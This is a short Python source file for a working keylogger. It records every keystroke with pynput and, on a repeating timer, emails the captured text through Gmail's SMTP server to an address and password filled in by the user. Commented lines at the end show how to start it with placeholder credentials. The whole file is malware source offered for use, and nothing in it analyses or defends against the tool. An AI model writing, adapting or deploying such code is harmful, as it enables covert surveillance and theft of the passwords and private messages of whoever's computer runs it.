import pynput.keyboard
import threading
import smtplib

log = ""


class Keylogger():
    def __init__(self, time_interval, email, password):
        self.log = None
        self.log = "Keylogger Started"
        self.interval = time_interval
        self.email = email
        self.password = password

    def key_pressed(self, key):
        try:
            self.log = self.log + str(key.char)
        except AttributeError:
            if key == key.space:
                self.log = self.log + " "
            else:
                self.log = self.log + " " + str(key) + " "

    def report(self):
        self.send_email(self.email,self.password,"\n\n" + self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()


    def send_email(self,email,password,message):
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()

    def start(self):
        keyboard_l = pynput.keyboard.Listener(on_press=self.key_pressed)
        with keyboard_l:
            self.report()
            keyboard_l.join()

#uncomment for usage and enter email + app email password
#keylog = Keylogger(100,"example@example.com", "passEXAMPLE")

#keylog.start()
